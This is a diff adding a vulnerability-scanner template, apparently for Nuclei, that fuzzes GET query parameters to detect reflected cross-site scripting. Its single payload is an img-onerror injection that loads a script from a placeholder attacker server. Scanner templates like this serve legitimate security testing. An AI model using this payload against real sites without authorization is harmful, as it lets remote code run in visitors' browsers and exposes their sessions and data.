@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-img
+
+info:
+  name: Custom Image XSS Detection
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using an image tag payload that injects a script.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      xss:
+        - "<img src=a onerror=\"var x=document.createElement('script');x.src='<attacker_server>/api.js';document.body.appendChild(x);\">"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xss}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
